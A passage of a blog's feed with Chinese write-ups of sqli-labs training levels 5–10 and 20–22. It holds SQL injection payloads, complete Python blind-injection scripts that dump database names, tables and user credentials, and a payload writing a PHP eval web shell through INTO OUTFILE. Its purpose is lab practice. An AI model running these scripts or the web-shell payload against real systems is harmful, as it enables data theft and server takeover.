information_schema.columns where table_name=”emails” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select email_id from emails limit 0,1),0x5e),1),”,”)#</p><p>Less-20 Cookie Injection- Error Based- string<br>在header里的Cookie附上payload：<br>uname=admin’ order by 3#<br>uname=x’ union select 1,database(),3#<br>uname=x’ union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x’ union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x’ union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p><p>Less-21 Cookie Injection- Error Based- complex - string<br>这里Cookie设置为以下payload的base64编码形式即可<br>uname=admin’) order by 3#<br>uname=x’) union select 1,database(),3#<br>uname=x’) union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x’) union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x’) union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p><p>Less-22 Cookie Injection- Error Based- Double Quotes - string<br>这里Cookie设置为以下payload的base64编码形式即可<br>uname=admin” order by 3#<br>uname=x” union select 1,database(),3#<br>uname=x” union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x” union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x” union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs-less11-15&quot;&gt;&lt;a href=&quot;#sqli-labs-less11-15&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs less11-15&quot;&gt;&lt;/a&gt;sqli-labs less11-15&lt;/h1&gt;&lt;p&gt;[T
      
    
    </summary>
    
      <category term="SQL" scheme="http://0xmj.club/categories/SQL/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs  less7-10</title>
    <link href="http://0xmj.club/2018/04/02/sqli-labs-less7-10/"/>
    <id>http://0xmj.club/2018/04/02/sqli-labs-less7-10/</id>
    <published>2018-04-02T08:15:23.000Z</published>
    <updated>2018-04-23T13:25:26.079Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-less7-10"><a href="#sqli-labs-less7-10" class="headerlink" title="sqli-labs  less7-10"></a>sqli-labs  less7-10</h1><p>[TOC]</p><h3 id="less-7：GET-基于错误-双引号-文件导出"><a href="#less-7：GET-基于错误-双引号-文件导出" class="headerlink" title="less-7：GET-基于错误-双引号-文件导出"></a>less-7：GET-基于错误-双引号-文件导出</h3><p>练习mysql的文件写入。我们的目的是将一句话木马写入到网站的Less-7目录下</p><p>先去用 ‘ “  之类的测试<br>发现，用 “ 返回页面无变化，用 ‘ 返回页面出错，说明这个结构肯定是带 ‘ 的。</p><p>‘ 的返回页面为：<br><img src="http://oy0tigw51.bkt.clouddn.com/201803172221_893.png" alt=""></p><p>但是绝对和单引号有关，所以试试 ‘)  ,  ‘))</p><p>‘) 也错了</p><p>‘)) 返回页面正常！！</p><p>说明sql语句应该是这样：</p><pre><code> select * from table where id = ((&#39;input&#39;));</code></pre><p><a href="http://43.247.91.228:84/Less-7/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-7/?id=1</a>‘)) union select 1,2,”&lt;?php @eval($_POST[‘cmd’]); ?&gt;” into outfile “/var/www/html/dd1.php”</p><h3 id="less-8：GET-基于布尔类型-盲注"><a href="#less-8：GET-基于布尔类型-盲注" class="headerlink" title="less-8：GET-基于布尔类型-盲注"></a>less-8：GET-基于布尔类型-盲注</h3><p>发现加个单引号跟没加显示不一样，加了单引号连you are in都不显示了，没有报错，所以只能用盲注判断了<br><a href="http://43.247.91.228:84/Less-8/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-8/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;64 %23  </p><p>放一个脚本：</p><pre><code># coding: utf-8import urllib2import urllibsuccess_str = &quot;You are in&quot;getTable = &quot;users&quot;index = &quot;0&quot;url = &quot;http://43.247.91.228:84/Less-8/?id=1&quot;database = &quot;database()&quot;selectDB = &quot;select database()&quot;selectTable = &quot;select table_name from information_schema.tables where table_schema=&#39;%s&#39; limit %d,1&quot;asciiPayload = &quot;&#39; and ascii(substr((%s),%d,1))&gt;=%d #&quot;lengthPayload = &quot;&#39; and length(%s)&gt;=%d #&quot;selectTableCountPayload = &quot;&#39;and (select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)&gt;=%d #&quot;selectTableNameLengthPayloadfront = &quot;&#39;and (select length(table_name) from information_schema.tables where table_schema=&#39;%s&#39; limit &quot;selectTableNameLengthPayloadbehind = &quot;,1)&gt;=%d #&quot;# 获取字符串的长度def getLengthOfString(payload, string):    # 猜长度    lengthLeft = 0    lengthRigth = 0    guess = 10    # 确定长度上限，每次增加5    while 1:        # 如果长度大于guess        if getLengthResult(payload, string, guess) == True:            # 猜测值增加5            guess = guess + 5        else:            lengthRigth = guess            break            # print &quot;lengthRigth: &quot; + str(lengthRigth)    # 二分法查长度    mid = (lengthLeft + lengthRigth) / 2    while lengthLeft &lt; lengthRigth - 1:        # 如果长度大于等于mid        if getLengthResult(payload, string, mid) == True:            # 更新长度的左边界为mid            lengthLeft = mid        else:            # 否则就是长度小于mid            # 更新长度的右边界为mid            lengthRigth = mid            # 更新中值        mid = (lengthLeft + lengthRigth) / 2        # print lengthLeft, lengthRigth    # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid    # 所以长度区间：大于等于 lengthLeft，小于lengthRigth    # 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度    # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8    return lengthLeft# 获取名称def getName(payload, string, lengthOfString):    # 32是空格，是第一个可显示的字符，127是delete，最后一个字符    tmp = &#39;&#39;    for i in xrange(1, lengthOfString + 1):        left = 32        right = 127        mid = (left + right) / 2        while left &lt; right - 1:            # 如果该字符串的第i个字符的ascii码大于等于mid            if getResult(payload, string, i, mid) == True:                # 则更新左边界                left = mid                mid = (left + right) / 2            else:                # 否则该字符串的第i个字符的ascii码小于mid                # 则更新右边界                right = mid                # 更新中值            mid = (left + right) / 2        tmp += chr(left)    return tmp# 发送请求，根据页面的返回的判断长度的猜测结果# string:猜测的字符串 payload:使用的payload  length：猜测的长度def getLengthResult(payload, string, length):    finalUrl = url + urllib.quote(payload % (string, length))    res = urllib2.urlopen(finalUrl)    if success_str in res.read():        return True    else:        return False # 发送请求，根据页面的返回的判断猜测的字符是否正确# payload:使用的payload    string:猜测的字符串   pos：猜测字符串的位置    ascii：猜测的asciidef getResult(payload, string, pos, ascii):    finalUrl = url + urllib.quote(payload % (string, pos, ascii))    res = urllib2.urlopen(finalUrl)    if success_str in res.read():        return True    else:        return False# 注入def inject():    # 猜数据库长度    lengthOfDBName = getLengthOfString(lengthPayload, database)    print &quot;length of DBname: &quot; + str(lengthOfDBName)    # 获取数据库名称    DBname = getName(asciiPayload, selectDB, lengthOfDBName)    print &quot;current database:&quot; + DBname    # 获取数据库中的表的个数    # print selectTableCountPayload    tableCount = getLengthOfString(selectTableCountPayload, DBname)    print &quot;count of talbe:&quot; + str(tableCount)    # 获取数据库中的表    for i in xrange(0, tableCount):        # 第几个表        num = str(i)        # 获取当前这个表的长度        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)        print &quot;current table length:&quot; + str(tableNameLength)        # 获取当前这个表的名字        selectTableName = selectTable % (DBname, i)        tableName = getName(asciiPayload, selectTableName, tableNameLength)        print tableName    selectColumnCountPayload = &quot;&#39;and (select count(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39;)&gt;=%d #&quot;    # print selectColumnCountPayload    # 获取指定表的列的数量    columnCount = getLengthOfString(selectColumnCountPayload, getTable)    print &quot;table:&quot; + getTable + &quot; --count of column:&quot; + str(columnCount)    # 获取该表有多少行数据    dataCountPayload = &quot;&#39;and (select count(*) from %s)&gt;=%d #&quot;    dataCount = getLengthOfString(dataCountPayload, getTable)    print &quot;table:&quot; + getTable + &quot; --count of data: &quot; + str(dataCount)    data = []    # 获取指定表中的列    for i in xrange(0, columnCount):        # 获取该列名字长度        selectColumnNameLengthPayload = &quot;&#39;and (select length(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit &quot; + str(            i) + &quot;,1)&gt;=%d #&quot;        # print selectColumnNameLengthPayload        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)        print &quot;current column length:&quot; + str(columnNameLength)        # 获取该列的名字        selectColumn = &quot;select column_name from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit %d,1&quot;        selectColumnName = selectColumn % (getTable, i)        # print selectColumnName        columnName = getName(asciiPayload, selectColumnName, columnNameLength)        print columnName        tmpData = []        tmpData.append(columnName)        # 获取该表的数据        for j in xrange(0, dataCount):            columnDataLengthPayload = &quot;&#39;and (select length(&quot; + columnName + &quot;) from %s limit &quot; + str(j) + &quot;,1)&gt;=%d #&quot;            # print columnDataLengthPayload            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)            # print columnDataLength            selectData = &quot;select &quot; + columnName + &quot; from users limit &quot; + str(j) + &quot;,1&quot;            columnData = getName(asciiPayload, selectData, columnDataLength)            # print columnData            tmpData.append(columnData)        data.append(tmpData)        # print data    # 格式化输出数据    # 输出列名    tmp = &quot;&quot;    for i in xrange(0, len(data)):        tmp += data[i][0] + &quot;   &quot;    print tmp    # 输出具体数据    for j in xrange(1, dataCount + 1):        tmp = &quot;&quot;        for i in xrange(0, len(data)):            tmp += data[i][j] + &quot;   &quot;        print tmpif __name__ == &quot;__main__&quot;:    print &quot;-----------inject starting----------&quot;    inject()</code></pre><p>与less5相似</p><h3 id="less-9：GET-基于时间类型-盲注"><a href="#less-9：GET-基于时间类型-盲注" class="headerlink" title="less-9：GET-基于时间类型-盲注"></a>less-9：GET-基于时间类型-盲注</h3><p>基于时间的盲注，只用修改一下上面的python脚本即可实现，加个时间判断，payload：<br><a href="http://127.0.0.1/sql/Less-9/?id=1" target="_blank" rel="external">http://127.0.0.1/sql/Less-9/?id=1</a>‘ and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(2)) %23<br>这里if判断为真，所以会执行sleep(2)，查询操作会有明显的延迟。如果为假，即不正确，那么就不会执行sleep(2)，页面回显会明显的很快。<br>在了解了这些基本知识之后，我们使用一下payload来sql注入<br><a href="http://192.168.1.158/sqli-labs/Less-8/?id=1‘" target="_blank" rel="external">http://192.168.1.158/sqli-labs/Less-8/?id=1‘</a> and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>第10关只要把前面两关payload部分的单引号改成双引号即可。<br>猜测数据库：<br><a href="http://127.0.0.1/sqllib/Less-10/?id=1&quot;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+" target="_blank" rel="external">http://127.0.0.1/sqllib/Less-10/?id=1&quot;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs-less7-10&quot;&gt;&lt;a href=&quot;#sqli-labs-less7-10&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs  less7-10&quot;&gt;&lt;/a&gt;sqli-labs  less7-10&lt;/h1&gt;&lt;p&gt;[TOC
      
    
    </summary>
    
      <category term="SQL" scheme="http://0xmj.club/categories/SQL/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs5-6(盲注)</title>
    <link href="http://0xmj.club/2018/04/02/sqli-labs5-6-%E7%9B%B2%E6%B3%A8/"/>
    <id>http://0xmj.club/2018/04/02/sqli-labs5-6-盲注/</id>
    <published>2018-04-02T08:14:58.000Z</published>
    <updated>2018-04-23T13:25:31.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs5-6-盲注"><a href="#sqli-labs5-6-盲注" class="headerlink" title="sqli-labs5-6(盲注)"></a>sqli-labs5-6(盲注)</h1><p>[TOC]</p><p>盲注分为以下三类：</p><p>Booleanbase（普通盲注）<br>Timebase（时间盲注）<br>Errorbase（基于报错的盲注）</p><h2 id="less-5：GET-基于错误-单引号-复杂注入语句"><a href="#less-5：GET-基于错误-单引号-复杂注入语句" class="headerlink" title="less-5：GET-基于错误-单引号-复杂注入语句"></a>less-5：GET-基于错误-单引号-复杂注入语句</h2><h3 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h3><p>如果所查询的用户id在数据库中，可以发现页面显示”You are in”，而不像前4关那样会显示出具体的账号密码。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171030_947.png" alt=""><br>如果sql语句查询结果不存在，则不会显示”You are in”</p><p>这种类型的SQL注入属于盲注型，使用id=1\观察报错信息<br><a href="http://43.247.91.228:84/Less-5/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1\</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803171016_51.png" alt=""></p><pre><code> MySQL server version for the right syntax to use near &#39;&#39;1\&#39; LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><p>near ‘’1’’ LIMIT 0,1’ at line 1</p><p>分离最外层的单引号：</p><p>near ‘       ‘   1’  ‘ LIMIT 0,1            ‘ at line 1</p><p>1’是手动输入的，但是还剩下一对双引号，说明后台sql语句应该是这样：</p><p>select * from talbe where id = ‘input’ </p><h3 id="2-猜测当前数据库长度："><a href="#2-猜测当前数据库长度：" class="headerlink" title="2.猜测当前数据库长度："></a>2.猜测当前数据库长度：</h3><p>首先获取当前数据库名的长度，用于之后的数据库名猜解<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=7)–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171110_250.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=8)–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171110_312.png" alt=""><br>上面的数字你可以从1开始递增，发现在 length(database())=8的时候，页面返回了正确信息，这说明当前数据库名长度为8</p><h3 id="3-猜测当前数据库名"><a href="#3-猜测当前数据库名" class="headerlink" title="3.猜测当前数据库名"></a>3.猜测当前数据库名</h3><p>方法一： python跑</p><pre><code>import requestsimport stringdataset = &quot; abcdefghijklmnopqrstuvwxyz_&quot;def sendPayload(payload):    url = &quot;http://localhost/sqli-labs-master/Less-5/?id=1&#39; &quot;+ payload    content = requests.get(url).text    return contentdef get_db_length():    count = 1    while count:        payload = &quot;and length(database())=&quot;        payload = payload + str(count) + &quot;%23&quot;        recv = sendPayload(payload)        if &quot;You are in&quot; in recv:            return count        else:            count += 1def getdbName(length):    result=&quot;&quot;    for k in range(length+1):            for j in dataset:                    payload=&quot;and left(database(),&quot;+str(k)+&quot;)=&#39;&quot;+result+j+&quot;&#39;%23&quot;                    recv=sendPayload(payload)                    if &quot;You are in&quot; in recv:                        if j !=&#39; &#39;:                            result+=j                            print result                        breakdef main():    length = get_db_length()     print &quot;the length of database is &quot;,length     getdbName(length)if __name__==&quot;__main__&quot;:    main()</code></pre><p>这里跑出来以后数据库名字是security。<br>方法二手注left：<br><a href="http://43.247.91.228:84/Less-5/?id=1‘" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1‘</a> and (left(database(),1)=’s’)–+<br>left(database(),1)=’s’表示数据库名从左往右取一个字符，判断该字符是否等于s<br>left(database(),2)=’se’表示数据库名从左往右取两个个字符，判断该字符是否等于se</p><p>方法三：使用ascii()函数和substr()函数进行夹逼 </p><blockquote><p>▲ascii(substr((select database()),1,1))=98<br>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换<br>为 ascii 值</p></blockquote><p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;114%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171141_827.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&lt;116%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171141_686.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))=115%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171142_763.png" alt=""><br>所以当前数据库名的第一位字符为’s’。</p><p>猜测当前数据库名的第二位字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),2,1)&gt;100%23<br>以此类推，最后得到当前数据库名为“security”。 </p><h3 id="4-猜测当前数据库的表名"><a href="#4-猜测当前数据库的表名" class="headerlink" title="4.猜测当前数据库的表名"></a>4.猜测当前数据库的表名</h3><p>猜测第一个数据表名的第一个字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171307_213.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;102%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171307_338.png" alt=""><br>d’&lt;’当前数据库第一个表名的第一个字符’&lt;’f’<br>当前数据库第一个表名的第一个字符为’e’。</p><p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘  and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108%23</p><p>方法二：</p><p>已经获取了数据库的名称，现在需要查出表的名称，这里需要使用ascii和substr这两个函数了。<br>获取完整表名有两个步骤：<br>①获取表的长度；<br>②利用ascii码获取单个表字符然后叠加。</p><pre><code>#!/usr/bin/env python#coding=utf-8import requestsimport stringdef get_data(payload):    url=&quot;http://localhost/sqli-labs-master/Less-5/?id=1&#39; &quot;+payload    content=requests.get(url).text    return contentdef get_table_length(i):    for j in range(0,20):        payload=&quot;and (select length(table_name) from information_schema.tables where table_schema=database() limit &quot;+str(i)+&quot;,1)=&quot;+str(j)+&quot;%23&quot;        #print payload        recv=get_data(payload)        if &quot;You are in&quot; in recv:            #print j            return jdef get_TableName():    for i in range(0,20):        result=&quot;&quot;        table_length=get_table_length(i)        if table_length is None:            break        #print table_length        for j in range(table_length+1):            for k in range(48,122):                payload=&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(i)+&quot;,1),&quot;+str(j)+&quot;,1))=&quot;+str(k)+&quot;%23&quot;                recv=get_data(payload)                if &quot;You are in&quot; in recv:                    result+=chr(k)                    print result                    breakdef main():    get_TableName()if __name__==&quot;__main__&quot;:    main()</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803171315_415.png" alt=""></p><h3 id="5-爆列名-表users下的所有列名"><a href="#5-爆列名-表users下的所有列名" class="headerlink" title="5.爆列名(表users下的所有列名)"></a>5.爆列名(表users下的所有列名)</h3><p>接下来就要猜解每个表里的列的个数、列名以及列名长度，列名猜解，和上面原理都差不多，这里不再赘述，直接给出payload(以users表为例子)。<br>猜解列的个数<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and %d=(select count(column_name) from information_schema.columns where table_name=’users’)–+<br>猜解列名长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))–+<br>猜解列名<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))=97–+</p><h3 id="6-爆出字段值-security-users下所有的账号密码"><a href="#6-爆出字段值-security-users下所有的账号密码" class="headerlink" title="6.爆出字段值(security.users下所有的账号密码)"></a>6.爆出字段值(security.users下所有的账号密码)</h3><p>最后就是要猜解每个列里面的具体字段的长度以及值了(这里以猜解username为例)<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and 1=(select count(username) from security.users)–+<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))–+<br>判断字段值<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))=95–+</p><h3 id="完整python代码"><a href="#完整python代码" class="headerlink" title="完整python代码"></a>完整python代码</h3><pre><code>import requestsurl = &#39;http://192.168.1.158/sqlilabs/Less-5/?id=1&#39;db_length = 0db_name = &#39;&#39;table_num = 0table_len = 0table_name = &#39;&#39;table_list = []column_num = 0column_len = 0column_name = &#39;&#39;column_list = []dump_num = 0dump_len = 0dump_name = &#39;&#39;dump_list = []i = j = k = 0### 当前数据库名长度 ###for i in range(1,20):    db_payload = &#39;&#39;&#39;&#39; and (length(database())=%d)--+&#39;&#39;&#39; %i    # print(url+db_payload)    r = requests.get(url+db_payload)    if &quot;You are in&quot; in r.text:        db_length = i        print(&#39;当前数据库名长度为：%d&#39; % db_length)        break### 当前数据库名 ###print(&#39;开始猜解数据库名......&#39;)for i in range(1,db_length+1):    for j in range(95,123):        db_payload = &#39;&#39;&#39;&#39; and (left(database(),%d)=&#39;%s&#39;)--+&#39;&#39;&#39; % (i,db_name+chr(j))        r = requests.get(url+db_payload)        if &quot;You are in&quot; in r.text:            db_name += chr(j)            # print(db_name)            breakprint(&#39;数据库名：\n[+]&#39;,db_name)### 当前数据库表的数目 ###for i in range(100):    db_payload = &#39;&#39;&#39;&#39; and %d=(select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)--+&#39;&#39;&#39; % (i,db_name)    r = requests.get(url+db_payload)    # print(url+db_payload)    if &quot;You are in&quot; in r.text:        table_num = i        breakprint(&#39;一共有%d张表&#39; % table_num)print(&#39;开始猜解表名......&#39;)### 每张表的表名长度及表名 ###for i in range(table_num):    table_len = 0    table_name = &#39;&#39;    #### 表名长度 ####    for j in range(1,21):        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit %d,1),%d,1))--+&#39;&#39;&#39; % (i,j)        r = requests.get(url+db_payload)        # print(db_payload)        if &quot;You are in&quot; not in r.text:            table_len = j-1            #### 猜解表名 ####            for k in range(1,table_len+1):                for l in range(95,123):                    db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (i,k,l)                    # print(db_payload)                    r = requests.get(url+db_payload)                    # print(db_payload)                    if &quot;You are in&quot; in r.text:                        table_name += chr(l)            print(table_name)            table_list.append(table_name)            breakprint(&#39;表名：&#39;,table_list)### 每个表的列的数目、列名及列名长度 ###for i in table_list:    #### 每个表的列的数目 ####    for j in range(100):        db_payload = &#39;&#39;&#39;&#39; and %d=(select count(column_name) from information_schema.columns where table_name=&#39;%s&#39;)--+&#39;&#39;&#39; % (        j, i)        r = requests.get(url + db_payload)        if &quot;You are in&quot; in r.text:            column_num = j            print((&quot;[+] 表名：%-10s\t&quot; % i) + str(column_num) + &#39;字段&#39;)            break#### 猜解列名长度 ####column_num = 3print(&#39;%s表中的列名：&#39; % table_list[-1])for j in range(3):    column_name = &#39;&#39;    for k in range(1,21):        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; limit %d,1),%d,1))--+&#39;&#39;&#39; % (table_list[-1],j,k)        r = requests.get(url+db_payload)        if &quot;You are in&quot; not in r.text:            column_len = k-1            # print(column_len)            break        #### 猜解列名 ####        for l in range(95,123):            db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (table_list[-1],j,k,l)            r = requests.get(url + db_payload)            if &quot;You are in&quot; in r.text:                column_name += chr(l)    print(&#39;[+] &#39;,column_name)    column_list.append(column_name)print(&#39;开始爆破以下字段：&#39;,column_list[1:])for column in column_list[1:]:    print(column,&#39;：&#39;)    dump_num = 0    for i in range(30):        db_payload = &#39;&#39;&#39;&#39; and %d=(select count(%s) from %s.%s)--+&#39;&#39;&#39; % (i,column,db_name,table_list[-1])        # print(db_payload)        r = requests.get(url+db_payload)        if &quot;You are in&quot; in r.text:            dump_num = i            # print(i)            break    for i in range(dump_num):        dump_len = 0        dump_name = &#39;&#39;        #### 字段长度 ####        for j in range(1, 21):            db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&#39;&#39;&#39; % (column,db_name,table_list[-1],i,j)            r = requests.get(url + db_payload)            if &quot;You are in&quot; not in r.text:                dump_len = j-1                for k in range(1, dump_len + 1):                    for l in range(1,256):                        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (column,db_name,table_list[-1],i,k,l)                        # print(db_payload)                        r = requests.get(url+db_payload)                        if &quot;You are in&quot; in r.text:                            dump_name += chr(l)                            # print(dump_name)                            break                break        print(&#39;[+]&#39;,dump_name)</code></pre><p>##less-6：GET-基于错误-双引号-复杂注入语句<br><a href="http://43.247.91.228:84/Less-6/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-6/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803172047_337.png" alt=""><br>your MySQL server version for the right syntax to use near ‘“1\” LIMIT 0,1’ at line 1<br> near ‘     “    1\    “ LIMIT 0,1    ‘ at line 1<br> 猜测后台语句：<br> select * from talbe where id = “input”<br>把less5代码中payload部分的’(单引号)改成”(双引号)即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs5-6-盲注&quot;&gt;&lt;a href=&quot;#sqli-labs5-6-盲注&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs5-6(盲注)&quot;&gt;&lt;/a&gt;sqli-labs5-6(盲注)&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;盲注分
      
    
    </summary>
    
      <category term="SQL" scheme="http://0xmj.club/categories/SQL/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-labs  1-4</title>
    <link href="http://0xmj.club/2018/04/02/Sqli-labs-1-4/"/>
    <id>http://0xmj.club/2018/04/02/Sqli-labs-1-4/</id>
    <published>2018-04-02T08:13:07.000Z</published>
    <updated>2018-04-23T13:25:14.109Z</updated>
    
